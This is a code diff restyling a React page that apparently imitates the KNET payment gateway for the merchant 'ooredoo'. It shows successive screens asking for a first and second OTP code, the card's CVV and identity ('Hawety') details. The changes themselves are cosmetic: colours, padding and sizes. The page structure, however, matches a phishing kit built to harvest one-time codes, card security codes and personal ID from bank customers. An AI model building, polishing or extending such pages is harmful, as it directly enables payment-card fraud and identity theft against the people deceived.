@@ -97,15 +97,15 @@ export default function Loading() {
           />
         </div>
 
-        <div className="w-full max-w-2xl mt-20">
+        <div className="w-full max-w-md mt-20">
           {/* Merchant Info Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
-            <div className="flex justify-center mb-4">
-              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
-                <span className="text-white font-bold text-xl">KNET</span>
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-4 mb-4 text-center">
+            <div className="flex justify-center mb-3">
+              <div className="w-12 h-12 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-sm">KNET</span>
               </div>
             </div>
-            <div className="space-y-2">
+            <div className="space-y-1 text-sm">
               <div className="flex justify-between items-center">
                 <span className="font-semibold text-gray-700">Merchant:</span>
                 <span className="text-gray-600">ooredoo</span>
@@ -118,7 +118,7 @@ export default function Loading() {
           </div>
 
           {/* Processing Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8 text-center">
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-6 text-center">
             <div className="flex justify-center mb-6">
               <div className="relative w-12 h-12">
                 <div className="absolute inset-0 border-4 border-blue-400 border-t-blue-600 rounded-full animate-spin"></div>
@@ -126,7 +126,7 @@ export default function Loading() {
             </div>
             
             <h2 className="text-xl font-bold text-gray-800 mb-2">Processing.. please wait ...</h2>
-            <p className="text-gray-700 text-sm mb-4">
+            <p className="text-gray-700 text-sm mb-3">
               يرجى الانتظار، جاري معالجة الدفع حالياً لحظات...
             </p>
             
@@ -161,15 +161,15 @@ export default function Loading() {
           />
         </div>
 
-        <div className="w-full max-w-2xl mt-20">
+        <div className="w-full max-w-md mt-20">
           {/* Merchant Info Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
-            <div className="flex justify-center mb-4">
-              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
-                <span className="text-white font-bold text-xl">KNET</span>
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-4 mb-4 text-center">
+            <div className="flex justify-center mb-3">
+              <div className="w-12 h-12 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-sm">KNET</span>
               </div>
             </div>
-            <div className="space-y-2">
+            <div className="space-y-1 text-sm">
               <div className="flex justify-between items-center">
                 <span className="font-semibold text-gray-700">Merchant:</span>
                 <span className="text-gray-600">ooredoo</span>
@@ -182,7 +182,7 @@ export default function Loading() {
           </div>
 
           {/* OTP Form Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-6">
             <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
               {currentStage === "otp1" ? "التحقق من الرمز الأول" : "التحقق من الرمز الثاني"}
             </h2>
@@ -249,15 +249,15 @@ export default function Loading() {
           />
         </div>
 
-        <div className="w-full max-w-2xl mt-20">
+        <div className="w-full max-w-md mt-20">
           {/* Merchant Info Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
-            <div className="flex justify-center mb-4">
-              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
-                <span className="text-white font-bold text-xl">KNET</span>
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-4 mb-4 text-center">
+            <div className="flex justify-center mb-3">
+              <div className="w-12 h-12 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-sm">KNET</span>
               </div>
             </div>
-            <div className="space-y-2">
+            <div className="space-y-1 text-sm">
               <div className="flex justify-between items-center">
                 <span className="font-semibold text-gray-700">Merchant:</span>
                 <span className="text-gray-600">ooredoo</span>
@@ -270,7 +270,7 @@ export default function Loading() {
           </div>
 
           {/* CVV Form Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-6">
             <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
               التحقق من رمز CVV
             </h2>
@@ -337,15 +337,15 @@ export default function Loading() {
           />
         </div>
 
-        <div className="w-full max-w-2xl mt-20">
+        <div className="w-full max-w-md mt-20">
           {/* Merchant Info Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
-            <div className="flex justify-center mb-4">
-              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
-                <span className="text-white font-bold text-xl">KNET</span>
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-4 mb-4 text-center">
+            <div className="flex justify-center mb-3">
+              <div className="w-12 h-12 bg-blue-600 rounded-lg flex items-center justify-center">
+                <span className="text-white font-bold text-sm">KNET</span>
               </div>
             </div>
-            <div className="space-y-2">
+            <div className="space-y-1 text-sm">
               <div className="flex justify-between items-center">
                 <span className="font-semibold text-gray-700">Merchant:</span>
                 <span className="text-gray-600">ooredoo</span>
@@ -358,7 +358,7 @@ export default function Loading() {
           </div>
 
           {/* Hawety Form Box */}
-          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
+          <div className="bg-white border-2 border-gray-400 rounded-lg p-6">
             <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
               التحقق من بيانات الهوية
             </h2>
